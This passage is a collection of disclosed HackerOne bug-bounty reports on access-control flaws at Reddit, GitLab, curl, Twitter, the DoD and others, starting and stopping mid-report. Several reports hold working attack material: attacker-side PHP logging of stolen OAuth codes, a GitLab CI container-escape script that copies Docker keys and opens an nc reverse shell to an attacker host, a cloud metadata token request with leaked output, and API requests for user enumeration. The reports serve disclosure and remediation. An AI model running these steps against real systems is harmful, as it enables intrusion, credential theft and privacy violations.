It will ask the parent window to stop injecting by postMessage, and it will run an interval looking for the `frames[1].window.name`, which is the regular www.redditmedia.com iframe of the window that was opened, as soon as it contains `code`, the value will be sent to the attacker main window through this frame. 
5. The attacker's main window will listen for a postMessage containing `code` and will show the state+code in the window. The page will then load an external logging-URL with the payload.

{F1726835}

6. The attacker now gets the token from the victim in his browser thanks to the monitoring of the log on my server:

{F1726836}

## Logging endpoints

I've added some endpoints in the HTML to log and parse the log to extract the code-parameter. You need to use your own endpoints if you don't want to try mine above from my link.

`https://USE-YOUR-OWN-LOGGER/reddit/log.php` looks like this:

```php
<?php

if (isset($_SERVER['QUERY_STRING'])) {
	file_put_contents('r.log', $_SERVER['QUERY_STRING']."\n", FILE_APPEND);
}
```

And `https://USE-YOUR-OWN-LOGGER/reddit/parse.php` looks like this:

```php
<?php
header("Access-Control-Allow-Origin: *");
header("Content-type: text/plain");

$key = @$_GET['q'];
if (!$key || !preg_match('#^[a-f0-9]{48}$#', $key)) { die; }
$data = explode("\n", file_get_contents('r.log'));
foreach($data as $line) {
	if (strpos($line, $key) !== false) {
		echo $line . "\n";
		die;
	}
}
```


# Mitigation

1. Remove fragment part when location is sent to www.redditmedia.com or any other party.
2. Restrict your `redirect_uri` of Apple-ID to something that does not load a domain that could run arbitrary javascript.

## Impact

Attacker can sign in as the victim. There's minimal interaction needed, only one click.

This took quite some time to get built :) I hope you'll like it!

Regards,
Frans

---

### [Unauthorized packages modification or secrets exfiltration via GitHub actions](https://hackerone.com/reports/1548870)

- **Report ID:** `1548870`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Linux Foundation Decentralized Trust
- **Reporter:** @dusty_wormwood
- **Bounty:** 1500 usd
- **Disclosed:** 2022-07-08T19:51:55.103Z
- **CVE(s):** -

**Summary (team):**

Thank you to @dusty_wormwood for working closely with the Iroha team to fix this issue.

**Summary (researcher):**

You can learn more about this vulnerability type at https://github.com/nikitastupin/pwnhub. Thanks to the Hyperledger team for thorough remediation and clear communication!

---

### [Authentication token and CSRF token bypass](https://hackerone.com/reports/998457)

- **Report ID:** `998457`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Enjin
- **Reporter:** @whiteshadow201
- **Bounty:** 300 usd
- **Disclosed:** 2022-06-19T12:11:40.319Z
- **CVE(s):** -

**Summary (team):**

@whiteshadow201 was able to illustrate a vulnerability, due to an overzealous set of CORS rules, where they could execute certain functions on behalf of another user. This was made possible due to a separate vulnerability, a CSRF bypass, that was possible by using the `GET` method to query the GraphQL interface. In order to remedy the problem, we restricted the GraphQL interface to only accept traffic over `POST` (rather than both `POST` and `GET`) and we also restricted the scope of the CORS rules.

---

### [error parse uri path in curl](https://hackerone.com/reports/1566462)

- **Report ID:** `1566462`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** curl
- **Reporter:** @iylz
- **Bounty:** - usd
- **Disclosed:** 2022-05-13T20:34:41.536Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
[add summary of the vulnerability]

The uri path error could lead to security filter bypasses. 
For example, 
we can use  curl  -vv 'f[h-j]le:///etc/passwd' to bypass  file protocol  black list
we can use  curl  -vv 'http://1.1.1.1:[80-9000]' to scan the open port in the host
etc ...

## Steps To Reproduce:
[add details for how we can reproduce the issue]

curl -vv 'f[h-j]le:///etc/passwd' will  parse 3 request , like  curl -vv 'fhle:///etc/passwd' 、curl -vv 'file:///etc/passwd' 、curl -vv 'fjle:///etc/passwd' 
```
[root@iz2ze9awqx4bwtc7j5q4hsz bin]# ./curl -Version
curl 7.83.1 (x86_64-pc-linux-gnu) libcurl/7.83.1 zlib/1.2.7
Release-Date: 2022-05-11
Protocols: dict file ftp gopher http imap mqtt pop3 rtsp smtp telnet tftp 
Features: alt-svc AsynchDNS IPv6 Largefile libz UnixSockets
[root@iz2ze9awqx4bwtc7j5q4hsz bin]# ./curl -vv 'f[h-j]le:///etc/passwd'
* Protocol "fhle" not supported or disabled in libcurl
* Closing connection -1
curl: (1) Protocol "fhle" not supported or disabled in libcurl
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-bus-proxy:x:999:998:systemd Bus Proxy:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:997:995::/var/lib/chrony:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
admin:x:1000:1000::/home/admin:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/sbin/nologin
squid:x:23:23::/var/spool/squid:/sbin/nologin
workftp:x:1002:1003::/home/work/ftp/:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
* Closing connection 0
* Protocol "fjle" not supported or disabled in libcurl
* Closing connection -1
curl: (1) Protocol "fjle" not supported or disabled in libcurl
[root@iz2ze9awqx4bwtc7j5q4hsz bin]# wget 'f[h-j]le:///etc/passwd'
f[h-j]le:///etc/passwd: 地址缺少协议类型.
[root@iz2ze9awqx4bwtc7j5q4hsz bin]# 
```

So, I think this is a security questions of  curl, because the wget doesn't have same question. Thinks 

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

bypass the security filter like the SSRF/RFL/LFI  etc.

---

### [Able to bypass email verification and change email to any other user email ](https://hackerone.com/reports/1551176)

- **Report ID:** `1551176`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Reddit
- **Reporter:** @bisesh
- **Bounty:** 5000 usd
- **Disclosed:** 2022-05-06T16:50:11.234Z
- **CVE(s):** -

**Summary (team):**

The reporter discovered they were able to hijack invites to other ads teams by adding the extra field, email, to a request that would allow them to bypass email verification. By doing so they were able to accept invites to ads teams on behalf of others and assume the role of the invitee with their own account. 

A snippet of the PoC is included in this summary below.
___

Steps to reproduce 
1. Create an account with any email you wish from https://ads.reddit.com 
2. Don't verify your email 
3. Go to https://ads.reddit.com/account/account_id/inventory-type and set any value to capture the request . 
4. Change your email to any arbitrary email.
5. Your email will be "verified" and you will be able to accept invites sent to the target email if that email had an invite to an ads team. 

```
PATCH /api/v2.0/accounts/<account_id> HTTP/2
Host: ads-api.reddit.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ads.reddit.com/
Authorization Bearer: ████████
Content-Type: application/json
Origin: https://ads.reddit.com
Content-Length: 101
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Cache-Control: max-age=0
Te: trailers

{"data":{"brand_safety_tier_preference":"EXPANDED",
"email":"█████"
}}

```

---

### [Container escape on public GitLab CI runners](https://hackerone.com/reports/1442118)

- **Report ID:** `1442118`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** GitLab
- **Reporter:** @ec0
- **Bounty:** - usd
- **Disclosed:** 2022-04-27T11:12:25.142Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

It is possible to circumvent the isolation in place for build jobs running on public CI runners by escaping the docker container running the build job.
This is possible via abuse of the cgroup release_agent functionality, made possible by CI jobs being allowed to mount filesystems inside the container.

From this host, I was able to spawn a root remote shell and run whatever I liked without restriction, including bypassing the iptables rules put in place to prevent access to the GCP metadata API. I was also able to gather sensitive data such as the instance token, GCP project ID and instance configuration, docker host TLS keys, firewall details, suricata configuration and user account names for the ops team, which could aid in further exploitation for a motivated attacker.

### Steps to reproduce

1. Sign up for a regular, free GitLab account.
2. Create a new project.
     An example repo is here: https://gitlab.com/ec0bb/citest (made private)
3. Add the below `.gitlab-ci.yaml`
```
image: python:latest
run:
  script:
    - bash shell.sh
```
4. Add the below `shell.sh`
```
export HOST=your.reverse.shell.box # customise this!

mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
export host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

touch /user/txt
touch /ca.pem
touch /server.pem
touch /server-key.pem
touch /ps.txt
echo '#!/bin/sh' > /cmd
echo "whoami > $host_path/user.txt" >> /cmd
echo "ps uax > $host_path/ps.txt" >> /cmd
echo "cat /etc/docker/ca.pem > $host_path/ca.pem" >> /cmd
echo "cat /etc/docker/server.pem > $host_path/server.pem" >> /cmd
echo "cat /etc/docker/server-key.pem > $host_path/server-key.pem" >> /cmd
echo "mount -o bind /var/run/docker.sock $host_path/docker.sock" >> /cmd
echo "/usr/bin/nc $HOST 1337 -e /bin/sh &" >> /cmd
chmod a+x /cmd

while test 1
do
  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
  sleep 60
done
```
5. Push the files to the repository.
6. Enable CI/CD jobs on the repository, in case they aren't, using the `.gitlab-ci.yml` in the repository.
7. Set up a reverse shell listener with `nc -lvp 1337` on the host you specified in the bash script above.
8. Run the job

### Impact

Based on the host configuration, there is a clear expectation that CI jobs should not have access to the host, given the use of $DOCKER_USER in the firewall rules, and the configuration in place to prevent access to GCP metadata and host configuration in the way the container is configured. 

Being able to break this confinement allows for unconstrained resource usage on the CI host, as well as access to GCP resources and also other hosts on the internal GCP network.  It is also possible to disable iptables and suricata entirely - so arbitrary software and docker images can also be downloaded and run, to facilitate things like cryptocoin mining, something the host has been configured to try and prevent via iptables and suricata rules. This could be used by an attacker to consume significant compute resources in the form of bandwidth usage and compute time, given how easy it is to spin up multiple GitLab accounts, and to restart jobs programmatically when the maximum execution time is reached.

I did not see any evidence of shared jobs in my testing, however if multiple jobs were scheduled on a dedicated runner (which I did not test) then this could also lead to a loss of confidentiality between jobs, as the full container configuration and contents are accessible once the container is escaped.

### Examples

Repo: https://gitlab.com/ec0bb/citest

GCP access (albeit limited) -
```
curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
{"access_token":"ya29.c.b0AXv0zTPHcDsuE3JOIVaFex7mGac13DuX3nI8XvoeSTANd0HfWmJ8BaTiE0P8GGRBVjOH3--Bangi4UVHqBpR7hLsfielnvZd5VWsRVM9xedCsFchJ1VlIl_RHRAgndu79QhAdEtquGQ9FVw8K_v-beS5zXMSh2DZNEfrUx6IgkAF3skn2sAkxg89XQm5gm067YQIAoaPlyI","expires_in":3326,"token_type":"Bearer"}

ya29.c.b0AXv0zTO_ny6xsfw0m5_YDMjdRUJbxx4jtnhEvrHEBghVmwDPL8GYx8UEQyB2spVmqtEy4IO_1kIONyCny-qwV7bi32okDSc8eNSTwXDUynLVayT3O0OiQ_FOCBlIMaU8Afx_Cbnr3xM7okiaMie0OWkRt4rHnYakWzXUZ_skTaLtN75GASDhs-mqFBe2LPFhj58eGf7DnFNk
token bb




instance/attributes/cos-update-strategy update_disabled
instance/attributes/sshKeys cos:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHZ9aaQ4+W
humgGQokzT+0zX+bS6AkSbs/JYeuoV8Sdb2cp88txEWoozuamR/S6MXp0lHF7hD2hmClvk5LESQLo9pe
FWXu8U1RZnYyN/pgAA3SpiLaWppxaEd5s5Ry/EXMLunbShenhpg05aby26wBHnBINU4ERITySAW362xT
zovivE+RA+yWUcuZUzpGTAGOeSqJpH7Gg4g86jMof7IG0Ybixt6LgRhK8tX6ryUw8eqWaAPwB4W/nQ6T
n2Eup21246PzVqMMhxo4O1dO2g7e2Jyqehvo7Yf5avc4kQ7h2LBrt033Esk1V5XFdzb++1kQxVkEUFor
wID4cGmMb0Av cos

instance/attributes/user-data #cloud-config

write_files:
- path: /etc/systemd/system/docker.service.d/20-run-binfmt-container.conf
  permissions: 0644
  owner: root
  content: |
    [Service]
    ExecStartPost=docker run --rm --privileged linuxkit/binfmt:v0.8

- path: /etc/systemd/system/docker.service.d/05-iptables-restore-wants.conf
  permissions: 0644
  owner: root
  content: |
    [Unit]
    Wants=network-online.target containerd.service iptables-restore.service
:
- path: /etc/systemd/system.conf
  permissions: 0644
  owner: root
  content: |
    [Manager]
    # Defaults from Google Container Optimized OS
    DefaultCPUAccounting=yes
    DefaultBlockIOAccounting=yes
    # Our custom timeout to speed-up VM shutdown
    # see: https://gitlab.com/gitlab-com/gl-infra/infrastructure/-/issues/13826#
note_632590419
    DefaultTimeoutStopSec=5s

- path: /var/lib/cloud/scripts/per-boot/00-enable-swap
  permissions: 0755
  owner: root
  content: |
    #!/usr/bin/env sh

    sysctl vm.disk_based_swap=1
    fallocate -l 2G /var/swapfile
    chmod 600 /var/swapfile
    mkswap /var/swapfile
    swapon /var/swapfile

- path: /var/lib/cloud/scripts/per-boot/01-configure-custom-sysctl
  permissions: 0755
  owner: root
  content: |
    #!/usr/bin/env sh

    # Required for Elasticsearch docker images to function:
    # https://gitlab.com/gitlab-com/infrastructure/issues/1687
    sysctl vm.max_map_count=262144

    # Swap is available, but not preferred
    sysctl vm.swappiness=10

instance/cpu-platform Intel Haswell
instance/description docker host vm
instance/disks/0/device-name persistent-disk-0
instance/disks/0/index 0
instance/disks/0/interface SCSI
instance/disks/0/mode READ_WRITE
instance/disks/0/type PERSISTENT
instance/hostname runner-jlguopmm-shared-1641423520-3feb5440.c.gitlab-ci-plan-fr
ee-6-f2de7a.internal
instance/id 8450900684160343118
instance/image projects/gitlab-ci-155816/global/images/runners-cos-stable-v20210
720-0
instance/legacy-endpoint-access/0.1 0
instance/legacy-endpoint-access/v1beta1 0
instance/licenses/0/id 6880041984096540132
instance/licenses/1/id 1001010
instance/licenses/2/id 166739712233658766
instance/machine-type projects/745008255720/machineTypes/n1-standard-1
instance/maintenance-event NONE
instance/name runner-jlguopmm-shared-1641423520-3feb5440
instance/network-interfaces/0/access-configs/0/external-ip 35.185.3.50
instance/network-interfaces/0/access-configs/0/type ONE_TO_ONE_NAT
instance/network-interfaces/0/dns-servers 169.254.169.254
instance/network-interfaces/0/gateway 10.10.8.1
instance/network-interfaces/0/ip 10.10.10.75
instance/network-interfaces/0/mac 42:01:0a:0a:0a:4b
instance/network-interfaces/0/mtu 1460
instance/network-interfaces/0/network projects/745008255720/networks/ephemeral-r
unners
instance/network-interfaces/0/subnetmask 255.255.248.0
instance/preempted FALSE
instance/remaining-cpu-time -1
instance/scheduling/automatic-restart TRUE
instance/scheduling/on-host-maintenance MIGRATE
instance/scheduling/preemptible FALSE
instance/service-accounts/default/aliases default
instance/service-accounts/default/email ephemeral-runner@gitlab-ci-plan-free-6-f
2de7a.iam.gserviceaccount.com
instance/service-accounts/default/scopes https://www.googleapis.com/auth/logging
.write
instance/service-accounts/default/scopes https://www.googleapis.com/auth/monitor
ing.write
instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
viceaccount.com/aliases default
instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
viceaccount.com/email ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gservice
account.com
instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
viceaccount.com/scopes https://www.googleapis.com/auth/logging.write
instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
viceaccount.com/scopes https://www.googleapis.com/auth/monitoring.write
instance/tags docker-machine
instance/virtual-clock/drift-token 0
instance/zone projects/745008255720/zones/us-east1-c
project/attributes/disable-legacy-endpoints TRUE
project/attributes/serial-port-logging-enable false
project/numeric-project-id 745008255720
project/project-id gitlab-ci-plan-free-6-f2de7a

computeMetadata/v1/instance/service-accounts/default/scopes \  
>     -H 'Metadata-Flavor:Google'
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```

docker access
```
root@runner-jlguopmm-shared-1641423520-3feb5440 /etc # docker ps
CONTAINER ID        IMAGE                                                      COMMAND                  CREATED             STATUS              PORTS               NAMES
a40074c0d2c5        a5d7930b60cc                                               "sh -c 'if [ -x /usr…"   25 minutes ago      Up 25 minutes                           runner-jlguopmm-project-27556964-concurrent-0-1abba63760b4a3af-build-2
8c1dbc222094        quay.io/gitlab/gitlab-runner-docker-cleanup:latest         "go-wrapper run"         5 months ago        Up 26 minutes                           gitlab-runner-docker-cleanup
fa185f65bc99        registry.gitlab.com/gitlab-org/ci-cd/suricata-runner:0.3   "/sbin/init"             5 months ago        Up 26 minutes                           suricata
17e19eb0ac0b        quay.io/prometheus/node-exporter:v1.0.1                    "/bin/node_exporter …"   5 months ago        Up 26 minutes                           node-exporter
```

runner TLS keys for communicating with the runner manager (also used for logstash auth)
```
root@runner-jlguopmm-shared-1641423520-3feb5440 /etc # file /mnt/stateful_partition/assets/ssl/*
runner.ca.crt:     PEM certificate
runner.client.crt: PEM certificate
runner.client.key: PEM RSA private key
```

## Impact

Unconfined remote code execution on CI host machines
Access to GCP API
Access to internal GCP network

---

### [Broken access control, can lead to legitimate user data loss](https://hackerone.com/reports/1493007)

- **Report ID:** `1493007`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @lubak
- **Bounty:** - usd
- **Disclosed:** 2022-04-07T20:03:26.165Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team,
During testing the security of ██████████ I found another possible attack vector:
(There are two reports preceding this one -  https://hackerone.com/reports/1489470 and  https://hackerone.com/reports/1489744)

I will try to explain:
When an user need access to that information system he fills a request form at:
https://█████████/████████
or
https://█████████/██████
After submitting the form the server response contains a █████████ which identifies this user request.
Then  the request is reviewed by an administrator, and he decides if user access will be granted or rejected.
The vulnerability I found is that unauthorized person can access the end point responsible for deleting user requests - █████████ and by providing just the ███ parameter he can delete any request.

## References

## Impact

An attacker can delete  legitimate user requests, disturbing the normal operation  of the system and causing data loss.
The user request ids are sequential numbers - my requests were given ids - ████████, so the attacker can delete all requests in the system by accessing the ████ end point with each ██████ from ██████████.

## System Host(s)
███████

## Affected Product(s) and Version(s)
██████████

## CVE Numbers


## Steps to Reproduce
1.  Activate Burp proxy, go to https://███/██████████, fill and submit the form (screenshot1)
2. Inspect server response in Burp and take a note of the returned █████ (screenshot2) which is number, referencing this user access request
3. (optional) we can confirm our request is in the system by performing the attack described in the other report I made (https://hackerone.com/reports/1489470) - resulting in our request being exfiltrated from the database:
execute following command, and replace the █████ parameter with the one you noted on step 2 (screenshot)
curl https://██████/██████████ -X POST -data="url=%2F████&██████████=████████" -k

4. Deleting the request - CAUTION - execute this step only by referencing ██████████ for requests, you made otherwise you will delete legitimate user request!(sceenshot4)
the command abusing the delete request endpoint is:
curl https://██████/███████████████ -X POST -data="url=%2F███████&███████=██████" -k

5. (optional) to confirm request is deleted you can execute again Step 3, which now responds with empty body - the request is no longer present in the database.

## Suggested Mitigation/Remediation Actions
The ██████████ endpoint should perform check if the user is logged in and authorized to use it.

---

### [IDOR at https://demo.sftool.gov/TwsHome/ScorecardManage/ via scorecard name](https://hackerone.com/reports/1472721)

- **Report ID:** `1472721`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. General Services Administration
- **Reporter:** @imthatt
- **Bounty:** - usd
- **Disclosed:** 2022-03-17T16:23:22.721Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Team,

I have found a broken access control vulnerability on https://demo.sftool.gov/ under your /tws directory. 
I made two accounts.
One account i browsed to /tws and created a new scorecard. Here i can submit all information I need. The scorecard name is in the end of the URL https://demo.sftool.gov/TwsHome/ScorecardManage/testdsfdfsf
I logged out this account
I logged into attacker account. I browse to https://demo.sftool.gov/TwsHome/ScorecardManage/testdsfdfsf (the last part is the name of the other accounts score card). I can now view the scorecard and even edit the score card from the attackers account. I can add accounts to read only and edit permissions on the score card and change information as-well as download the score card.

Log back into the victim account and the scorecard information has been changed, downloaded and attacker has assigned permissions.

We can brute force scorecard names but i am not doing this as the above on my accounts already shows the issue.

Many thanks
Holla

## Impact

An attacker can read, edit and download and assign permissions to another users scorecard.

---

### [Public Jenkins instance with /script enabled](https://hackerone.com/reports/1492447)

- **Report ID:** `1492447`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** IBM
- **Reporter:** @thesanjok
- **Bounty:** - usd
- **Disclosed:** 2022-03-11T18:47:00.155Z
- **CVE(s):** -

**Summary (team):**

An RCE/LFI due to Public Jenkins instance with /script enabled was reported to IBM February 26th, analyzed and has been remediated since March 3rd, 2022. Thank you to Sanjok Karki (thesanjok) for the finding.

**Summary (researcher):**

RCE/LFI due to Public Jenkins instance with /script enabled.

---

### [Broken Authentication](https://hackerone.com/reports/409237)

- **Report ID:** `409237`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @websecnl
- **Bounty:** - usd
- **Disclosed:** 2022-02-14T21:29:11.035Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** IDOR

**Description:** It is possible to access other user account by changing the parameter 'email' to another valid e-mail, i managed to guess an existing user '███████@███.com' which discloses the ███ 
Name and Surname.

## Impact
Information Disclosure

## Step-by-step Reproduction Instructions

1.Visit: https://██████
2. Register for an account
3. Follow the steps like in the attached pictures

## Product, Version, and Configuration (If applicable)
Web Application

## Suggested Mitigation/Remediation Actions
https://www.owasp.org/index.php/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet

## Impact

Information Disclosure

---

### [Discoverability by phone number/email restriction bypass](https://hackerone.com/reports/1439026)

- **Report ID:** `1439026`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** X / xAI
- **Reporter:** @zhirinovskiy
- **Bounty:** 5040 usd
- **Disclosed:** 2022-02-11T17:00:31.711Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** By using this vulnerability an attacker can find a twitter account by it's phone number/email even if the user has prohibited this in the privacy options.

**Description:** The vulnerability allows any party  without any authentication to obtain a **twitter ID**(which is almost equal to getting the username of an account) of **any** user by submitting a phone number/email even though the user has **prohibitted this action in the privacy settings**. The bug exists due to the proccess of authorization used in the Android Client of Twitter, specifically in the procces of checking the duplication of a Twitter account.

## Steps To Reproduce:

In this example I will show you how to get a Twitter ID of a user with an email "████████" (this an account created by me to demonstrate this bug)
  0.Disable discoverability in your Twitter account settings 
  1. At first we create a LoginFlow by sending a POST request to 
https://api.twitter.com/1.1/onboarding/task.json?flow_name=login

Headers (stay the same for all the requests):
>User-Agent: ████ (████)
>Accept-Encoding: gzip, deflate
>Authorization: Bearer ███████
>X-Guest-Token: █████ __#This value changes dynamically and must be generated every once in a while__
>Accept: application/json
>X-Twitter-Client: TwitterAndroid
>System-User-Agent: ██████
>Content-Encoding: application/json
>Content-Type: application/json
>Accept-Language: en-US

Body:
>{"flow_token":null,"input_flow_data":{"country_code":null,"flow_context":{"start_location":{"location":"deeplink"}},"requested_variant":null,"target_user_id":0}}

Response:
>{"flow_token":"**██████**","status":"success","subtasks":[{"subtask_id":"LoginEnterUserIdentifier","enter_text":{"primary_text":{"text":"To get started, first enter your phone, email, or @username","entities":[]},"hint_text":"Phone, email, or username","multiline":false,"auto_capitalization_type":"none","auto_correction_enabled":false,"os_content_type":"username","keyboard_type":"text","next_link":{"link_type":"task","link_id":"next_link","label":"Next"},"skip_link":{"link_type":"subtask","link_id":"forget_password","label":"Forgot password?","subtask_id":"RedirectToPasswordReset"}},"subtask_back_navigation":"cancel_flow"},{"subtask_id":"RedirectToPasswordReset","open_link":{"link":{"link_type":"deep_link_and_abort","link_id":"password_reset_deep_link","url":"twitter://onboarding/task?flow_name=password_reset&input_flow_data=%7B%22requested_variant%22%3A%███%22%7D"}}}]}

As you can see we have aquired the flow token value which is used in the next request.

2.  Send a POST request to https://api.twitter.com/1.1/onboarding/task.json with the same headers and a flow token aquired in the previous response

Body:
>{"flow_token":"██████","subtask_inputs":[{"enter_text": {"suggestion_id":null, "text": "**█████████**", "link": "next_link"},
                           "subtask_id": "LoginEnterUserIdentifier"}]}

Response:
>{"flow_token":"████","status":"success","subtasks":[{"subtask_id":"AccountDuplicationCheck","check_logged_in_account":{"true_link":{"link_type":"task","link_id":"AccountDuplicationCheck_true"},"false_link":{"link_type":"task","link_id":"AccountDuplicationCheck_false"},"user_id":"**███**"}}]}
As you can see we have aquired the user ID which can then be used  to get the **full info** about the twitter account (there are many ways to do this), even though I have **disabled discoverability** in my user settings! 

## Impact: 
This is a serious threat, as people can not only find users who have restricted the ability to be found by email/phone number, but any attacker with a basic knowledge of scripting/coding can enumerate a big chunk of the Twitter user base unavaliable to enumeration prior (**create a database with phone/email to username connections**). Such bases can be sold to malicious parties for advertising purposes, or for the purposes of tageting celebrities in different malicious activities
Also a cool feature that I discoverd is that you can even find the id's of suspended Twitter accounts using this method.

## Supporting Material/References:

  * ██████ A simple console Python script that demonstrates this vulnerabilty (requires the requests library to run)

## Impact

This is a serious threat, as people can not only find users who have disbaled discoverability by email/phone number, but any attacker with a basic knowledge of scripting/coding can enumerate a big chunk of the Twitter user base unavaliable to enumeration prior (create a database with phone/email to username connections). Such bases can be sold to malicious parties for advertising purposes, or for the purposes of tageting celebrities in different malicious activities. 
**Short: this can lead to a loss of privacy for many users.**

---

### [Critically Sensitive Spring Boot Endpoints Exposed](https://hackerone.com/reports/1022048)

- **Report ID:** `1022048`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Semrush
- **Reporter:** @a_d_a_m
- **Bounty:** - usd
- **Disclosed:** 2022-02-10T16:10:12.176Z
- **CVE(s):** -

**Summary (team):**

Spring Boot includes a number of additional features to help you monitor and manage your application when you push it to production. 
Hacker found that actuator endpoints containing potentially sensitive data (such as internal tokens and service data) were left public.

**Summary (researcher):**

Semrush has a microservices architecture, there is an API gateway which routes to the server corresponding to the service in the internal network. Some Semrush services use spring boot with actuator endpoints enabled, some services left these endpoints publicly accessible. It was therefore possible to access it as follow: https://semrush.com/service-xyz/actuator/ . Some endpoints leaked sensitive internal data.

---

### [Developer uploaded files missing authentication on LINE GAME Developers site(gdc.game.line.me)](https://hackerone.com/reports/969605)

- **Report ID:** `969605`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** LY Corporation
- **Reporter:** @tosun
- **Bounty:** - usd
- **Disclosed:** 2021-12-27T01:41:45.862Z
- **CVE(s):** -

**Summary (team):**

IDOR vulnerability at gdc.game.line.me allowed unauthenticated users to perform brute-force attacks to disclose unauthorized files related to service testing and QA.

---

### [Unauthenticated Access to Admin Panel Functions at https://███████/███](https://hackerone.com/reports/1397564)

- **Report ID:** `1397564`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @palaziv
- **Bounty:** - usd
- **Disclosed:** 2021-11-29T22:16:07.481Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
The admin panel at https://██████████/████████ and all its functions can be accessed without authentication. This is basically the same vulnerability as in #1394910, just on another system.

## Impact

An attacker is able to use the administrative functions in order to upload, delete or modify files.

## System Host(s)
███

## Affected Product(s) and Version(s)
██████████

## CVE Numbers


## Steps to Reproduce
* Navigate to https://███/ and click on the "Authenticate ██████████" button
* Notice how the application first sends an HTTP POST request to https://███████/████████ which should redirect to https://██████/██████████ (`Location: █████`). Navigating to  https://███/██████ redirects to https://█████/███
* Looking at the response to https://█████/███ I noticed that even though the server sent back a 302 status code with a header `Location: /██████████` the response was quite long
* I browsed to https://█████████/████████, intercepted the response in Burp, changed the status code from `302 Found` to `200 OK` and was presented with the admin panel (this kind of attack is called [Execution after Redirect](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR))). Below you can see the unmodified response containing links to the ██████ Admin Functions:

```
HTTP/1.1 302 Found
Date: Wed, 10 Nov 2021 14:28:15 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: /██████
Pragma: no-cache
Set-Cookie: █████████; path=/; HttpOnly
Set-Cookie: ███████; Path=/; HttpOnly; Secure
X-Vcap-Request-Id: 3c110e5d-196e-46f4-503d-222157e0c465
Strict-Transport-Security: max-age=31536000; includeSubDomains
██████████████████
Content-Length: 4266


<!-- Unused LIMDIS banner in WWW  

<table align="center" width="800" border="1" cellspacing="1"
	cellpadding="1" bgcolor="#008000">
	<tr>
		<td style="color: #FFF";  align="center">LIMITED DISTRIBUTION<br> <font
			size="2px">Distribution authorized to DoD, IAW 10 U.S.C. §§ 130 &
				455. Release authorized to U.S. DoD contractors, IAW 48 C.F.R. §
